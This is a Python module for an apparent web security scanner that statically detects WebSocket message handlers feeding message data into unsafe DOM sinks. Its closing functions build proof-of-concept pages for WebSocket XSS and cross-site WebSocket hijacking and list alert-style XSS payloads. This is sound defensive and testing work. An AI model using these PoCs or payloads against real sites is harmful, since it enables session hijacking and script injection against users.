"""WebSocket XSS detection.

WebSockets (``ws://`` / ``wss://``) are full-duplex channels that
bypass the same-origin policy: any origin can open a WebSocket to a
server, and any server can push messages to any connected client.
When a client passes ``event.data`` from a ``ws.onmessage`` handler
to a dangerous sink (``innerHTML``, ``eval``, ``document.write``,
``new Function``, jQuery ``.html()``, etc.) WITHOUT validating the
origin of the message OR the shape of the data, an attacker who
controls the WebSocket server (or who can MITM an unencrypted
``ws://`` connection) can deliver an XSS payload.

Vulnerable pattern::

    var ws = new WebSocket('wss://chat.example.com/socket');
    ws.onmessage = function(e) {
      document.getElementById('out').innerHTML = e.data;  // sink!
    };

Exploitation:

  * **Rogue WebSocket server** -- if the page connects to ``ws://``
    (unencrypted) and the attacker is on the network path, they can
    intercept the connection and push a payload message.

  * **Cross-site WebSocket hijacking (CSWSH)** -- if the WebSocket
    server does not validate the ``Origin`` header, an attacker page
    can open a socket to the victim's WebSocket endpoint using the
    victim's cookies (sent on WebSocket handshakes), impersonating
    the user.  The server then pushes user-specific data to the
    attacker's page, where it can be exfiltrated.  When the page
    also renders ``ws.onmessage`` payloads raw, the rogue server
    can deliver XSS.

  * **Compromised WebSocket server** -- if the WebSocket endpoint
    itself is compromised (or is a third-party service), it can
    push XSS payloads to all connected clients that have unsafe
    sinks.

This module performs STATIC analysis of the page's HTML/JS to find
``new WebSocket(...)`` call sites and ``onmessage`` / ``addEventListener('message')``
handlers that feed ``event.data`` into dangerous sinks.
"""
from __future__ import annotations
import re


# ---------------------------------------------------------------------------
# WebSocket construction / connection detection
# ---------------------------------------------------------------------------

# ``new WebSocket('ws://...' / 'wss://...')`` -- captures the URL expression.
WEBSOCKET_CTOR_RE = re.compile(
    r'new\s+WebSocket\s*\(\s*'
    r'([^,;)]+)',
    re.IGNORECASE,
)

# A ws:// or wss:// URL literal anywhere in the page.
WS_URL_RE = re.compile(
    r'wss?:\/\/[^"\'`\s<>]+',
    re.IGNORECASE,
)

# WebSocket event listener registration: ``ws.onmessage = ...`` or
# ``ws.addEventListener('message', ...)``.
ONMESSAGE_RE = re.compile(
    r'\.onmessage\s*='
    r'|\.addEventListener\s*\(\s*["\']message["\']',
    re.IGNORECASE,
)

# References to ``event.data`` / ``e.data`` / ``msg.data`` / ``evt.data``
# inside a message handler.
DATA_REF_RE = re.compile(
    r'\b(?:event|e|ev|msg|message|evt|d|data|payload)\.data\b',
    re.IGNORECASE,
)

# Origin / source validation references.  If the handler checks
# ``event.origin`` (which is always the WebSocket server's origin,
# so this is mostly a no-op for WebSocket -- but a developer who
# wrote it signal intent to validate) we treat it as a mitigating
# signal.
ORIGIN_CHECK_RE = re.compile(
    r'\b(?:event|e|msg|message|evt)\.origin\b',
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# Dangerous sinks fed by WebSocket message data
# ---------------------------------------------------------------------------

# Each entry: (sink_regex, severity, description)
DANGER_SINKS: list[tuple[str, str, str]] = [
    (r'\.innerHTML\s*[\+\-\*\/]?=', "high",
     "innerHTML assignment from WebSocket message payload"),
    (r'\.outerHTML\s*[\+\-\*\/]?=', "high",
     "outerHTML assignment from WebSocket message payload"),
    (r'insertAdjacentHTML\s*\(', "high",
     "insertAdjacentHTML from WebSocket message payload"),
    (r'document\.write\s*\(', "high",
     "document.write from WebSocket message payload"),
    (r'document\.writeln\s*\(', "high",
     "document.writeln from WebSocket message payload"),
    (r'\beval\s*\(', "high",
     "eval() of WebSocket message payload"),
    (r'setTimeout\s*\(\s*[^,)]*[a-zA-Z]', "high",
     "setTimeout(string) from WebSocket message payload"),
    (r'setInterval\s*\(\s*[^,)]*[a-zA-Z]', "high",
     "setInterval(string) from WebSocket message payload"),
    (r'new\s+Function\s*\(', "high",
     "new Function() of WebSocket message payload"),
    (r'\.src\s*[\+\-\*\/]?=', "high",
     ".src assignment from WebSocket message payload"),
    (r'\.href\s*[\+\-\*\/]?=', "high",
     ".href assignment from WebSocket message payload"),
    (r'\.action\s*[\+\-\*\/]?=', "high",
     ".action assignment from WebSocket message payload"),
    (r'location\s*[\+\-\*\/]?=', "high",
     "location assignment from WebSocket message payload"),
    (r'location\.href\s*[\+\-\*\/]?=', "high",
     "location.href assignment from WebSocket message payload"),
    (r'location\.assign\s*\(', "medium",
     "location.assign from WebSocket message payload"),
    (r'\.setAttribute\s*\(\s*["\'](?:on\w+|href|src|action|formaction|style|data-[a-z]+)["\']',
     "medium",
     "setAttribute for dangerous attribute from WebSocket message payload"),
    (r'jQuery\s*(?:\.\s*html\s*\(|\$\([^)]*\)\.html\s*\()', "high",
     "jQuery .html() from WebSocket message payload"),
    (r'\$\s*\([^)]*\)\s*\.(?:append|prepend|after|before|replaceWith|wrap)\s*\(',
     "medium",
     "jQuery DOM insertion from WebSocket message payload"),
    (r'dangerouslySetInnerHTML', "high",
     "React dangerouslySetInnerHTML from WebSocket message payload"),
    (r'\bv-html\s*=', "high",
     "Vue v-html directive from WebSocket message payload"),
    (r'\[innerHTML\]\s*=', "high",
     "Angular [innerHTML] binding from WebSocket message payload"),
    (r'\{@html\b', "high",
     "Svelte {@html} tag from WebSocket message payload"),
]

# Combined regex for sink detection (any sink).
SINK_RE = re.compile(
    "|".join("(?:%s)" % s[0] for s in DANGER_SINKS),
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def find_websocket_handlers(html_or_js: str) -> list[dict]:
    """Find WebSocket message handlers in the page/script.

    Returns a list of dicts::

        {
            "snippet":         str,    # ~300 chars around the handler
            "ws_url":          str,    # WebSocket URL if found nearby
            "has_sink":        bool,   # handler body calls a dangerous sink
            "has_data_ref":    bool,   # handler references event.data
            "has_origin_check": bool,  # handler references event.origin
            "sinks_found":     list[str],  # human-readable sink descriptions
            "exploitable":     bool,   # has_sink AND has_data_ref
                                        # AND NOT has_origin_check
        }
    """
    if not html_or_js:
        return []

    findings: list[dict] = []
    script_blocks: list[str] = []
    for m in re.finditer(r'<script[^>]*>(.*?)</script>',
                         html_or_js, re.IGNORECASE | re.DOTALL):
        script_blocks.append(m.group(1))
    if not script_blocks:
        script_blocks = [html_or_js]

    for script in script_blocks:
        # Find WebSocket constructor calls first (to capture the URL).
        ws_urls = [m.group(1).strip() for m in WEBSOCKET_CTOR_RE.finditer(script)]
        # Also scan for bare ws:// URLs.
        for m in WS_URL_RE.finditer(script):
            ws_urls.append(m.group(0))

        for lm in ONMESSAGE_RE.finditer(script):
            start = max(0, lm.start() - 40)
            end = min(len(script), lm.end() + 600)
            snippet = script[start:end]
            has_sink = bool(SINK_RE.search(snippet))
            has_data_ref = bool(DATA_REF_RE.search(snippet))
            has_origin_check = bool(ORIGIN_CHECK_RE.search(snippet))
            sinks_found = [desc for pat, _, desc in DANGER_SINKS
                           if re.search(pat, snippet, re.IGNORECASE)]
            exploitable = (has_sink and has_data_ref and not has_origin_check)

            # Pick the closest preceding ws_url.
            ws_url = ""
            if ws_urls:
                # Find any ws_url that appears before this listener in the script.
                pos = lm.start()
                preceding = [u for u in ws_urls
                             if script.find(u) <= pos]
                if preceding:
                    ws_url = preceding[-1]

            findings.append({
                "snippet": snippet.strip()[:400],
                "ws_url": ws_url,
                "has_sink": has_sink,
                "has_data_ref": has_data_ref,
                "has_origin_check": has_origin_check,
                "sinks_found": sinks_found,
                "exploitable": exploitable,
            })
    return findings


def detect_websocket_usage(html: str | None) -> dict:
    """Detect WebSocket usage on a page (without sink analysis).

    Returns::

        {
            "has_websocket": bool,
            "ws_urls":       list[str],  # ws:// or wss:// URLs found
            "ctor_count":    int,        # new WebSocket(...) calls
            "handler_count": int,        # onmessage / addEventListener('message')
            "uses_insecure_ws": bool,    # any ws:// (non-TLS) URL
        }
    """
    if not html:
        return {
            "has_websocket": False,
            "ws_urls": [],
            "ctor_count": 0,
            "handler_count": 0,
            "uses_insecure_ws": False,
        }

    ctor_count = len(WEBSOCKET_CTOR_RE.findall(html))
    handler_count = len(ONMESSAGE_RE.findall(html))

    ws_urls: list[str] = []
    seen: set[str] = set()
    for m in WS_URL_RE.finditer(html):
        u = m.group(0)
        if u not in seen:
            seen.add(u)
            ws_urls.append(u)
    # Also extract URLs from constructor calls (they may be variable refs).
    for m in WEBSOCKET_CTOR_RE.finditer(html):
        expr = m.group(1).strip().strip("'\"`")
        if expr.startswith(("ws://", "wss://")) and expr not in seen:
            seen.add(expr)
            ws_urls.append(expr)

    uses_insecure_ws = any(u.lower().startswith("ws://") for u in ws_urls)
    has_websocket = ctor_count > 0 or bool(ws_urls) or handler_count > 0

    return {
        "has_websocket": has_websocket,
        "ws_urls": ws_urls,
        "ctor_count": ctor_count,
        "handler_count": handler_count,
        "uses_insecure_ws": uses_insecure_ws,
    }


def analyze_page(html: str | None) -> dict:
    """Analyze a page for vulnerable WebSocket message handlers.

    Returns::

        {
            "has_websocket":    bool,
            "usage":            dict,         # detect_websocket_usage output
            "handlers":         list[dict],   # only exploitable handlers
            "vulnerable_count": int,
            "uses_insecure_ws": bool,         # ws:// (non-TLS) endpoint
            "missing_origin_check": bool,     # any handler lacks origin check
        }
    """
    usage = detect_websocket_usage(html)
    handlers = find_websocket_handlers(html or "")
    vulnerable = [h for h in handlers if h["exploitable"]]
    return {
        "has_websocket": usage["has_websocket"],
        "usage": usage,
        "handlers": vulnerable,
        "vulnerable_count": len(vulnerable),
        "uses_insecure_ws": usage["uses_insecure_ws"],
        "missing_origin_check": any(
            not h["has_origin_check"] for h in handlers
        ),
    }


def build_poc_html(
    target_url: str,
    ws_url: str = "",
    payload: str = "<img src=x onerror=alert(1)>",
) -> str:
    """Build a PoC HTML page that exploits a vulnerable WebSocket handler.

    The PoC opens the same WebSocket the victim page uses and sends the
    payload as a message.  When the victim's ``onmessage`` handler
    writes ``event.data`` to ``innerHTML``, the payload executes.

    If the WebSocket server requires the victim's cookies (CSWSH
    scenario), the PoC must be served from a page the victim visits;
    the browser will attach cookies to the WebSocket handshake
    automatically.
    """
    if not target_url:
        return ""
    if not ws_url:
        ws_url = "wss://" + target_url.split("://")[-1] + "/ws"
    # JS-string-safe versions.
    js_url = target_url.replace("\\", "\\\\").replace("'", "\\'").replace("</", "<\\/")
    js_ws = ws_url.replace("\\", "\\\\").replace("'", "\\'").replace("</", "<\\/")
    js_payload = (
        payload.replace("\\", "\\\\")
        .replace("'", "\\'")
        .replace("\n", "\\n")
        .replace("\r", "\\r")
        .replace("</", "<\\/")
    )
    html_payload = (
        payload.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
    )

    return f"""<!doctype html>
<html><head><meta charset="utf-8"><title>WebSocket XSS PoC</title></head>
<body>
<h2>WebSocket XSS PoC</h2>
<p>Victim page: <code>{target_url}</code></p>
<p>WebSocket endpoint: <code>{ws_url}</code></p>
<p>Payload: <code>{html_payload}</code></p>
<p>Open this page in a browser that has the victim site's cookies.
The script connects to the same WebSocket endpoint (cookies are sent
automatically on the handshake), then sends the payload.  The victim
page's <code>onmessage</code> handler writes <code>event.data</code>
to <code>innerHTML</code>, firing the payload.</p>
<hr>
<pre id="log">(no output yet)</pre>
<script>
  var log = document.getElementById('log');
  function append(s) {{
    log.textContent = s;
  }}
  try {{
    var ws = new WebSocket('{js_ws}');
    ws.onopen = function() {{
      append('connected; sending payload');
      ws.send('{js_payload}');
    }};
    ws.onmessage = function(e) {{
      append('server reply: ' + e.data);
    }};
    ws.onerror = function(e) {{
      append('WebSocket error: ' + e);
    }};
  }} catch (e) {{
    append('WebSocket construction failed: ' + e);
  }}
</script>
</body></html>
"""


def build_poc_cswsh(target_url: str, ws_url: str, payload: str) -> str:
    """Build a Cross-Site WebSocket Hijacking (CSWSH) PoC.

    The PoC is served from an attacker-controlled origin.  When the
    victim visits it, the browser opens a WebSocket to ``ws_url``
    using the victim's cookies for that origin.  If the WebSocket
    server does not validate the ``Origin`` header, the connection
    succeeds and the attacker page can read user-specific data.

    If the victim page ALSO has an unsafe ``onmessage`` sink, the
    attacker page can demonstrate XSS by sending the payload to the
    WebSocket server (if the server echoes) or by directly rendering
    the server's pushed messages.
    """
    if not ws_url:
        return ""
    js_ws = ws_url.replace("\\", "\\\\").replace("'", "\\'").replace("</", "<\\/")
    js_payload = (
        payload.replace("\\", "\\\\")
        .replace("'", "\\'")
        .replace("</", "<\\/")
    )
    return f"""<!doctype html>
<html><head><meta charset="utf-8"><title>CSWSH PoC</title></head>
<body>
<h2>Cross-Site WebSocket Hijacking PoC</h2>
<p>WebSocket endpoint: <code>{ws_url}</code></p>
<p>This page opens a WebSocket to the victim endpoint.  The browser
attaches the victim's cookies to the handshake.  If the server does
not validate the <code>Origin</code> header, the connection succeeds
and the attacker page can read user-specific messages.</p>
<pre id="out">(waiting...)</pre>
<script>
  var out = document.getElementById('out');
  try {{
    var ws = new WebSocket('{js_ws}');
    ws.onopen = function() {{
      out.textContent = 'connected (CSWSH succeeded -- Origin not checked)';
      // Optionally send a payload to trigger an unsafe sink on the
      // victim page if the server echoes messages back.
      ws.send('{js_payload}');
    }};
    ws.onmessage = function(e) {{
      out.textContent += '\\n[server]: ' + e.data;
    }};
    ws.onerror = function() {{
      out.textContent = 'blocked (Origin checked -- CSWSH failed)';
    }};
  }} catch (e) {{
    out.textContent = 'error: ' + e;
  }}
</script>
</body></html>
"""


def dangerous_payloads() -> list[str]:
    """High-yield WebSocket XSS payloads for testing."""
    return [
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<script>alert(1)</script>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
    ]
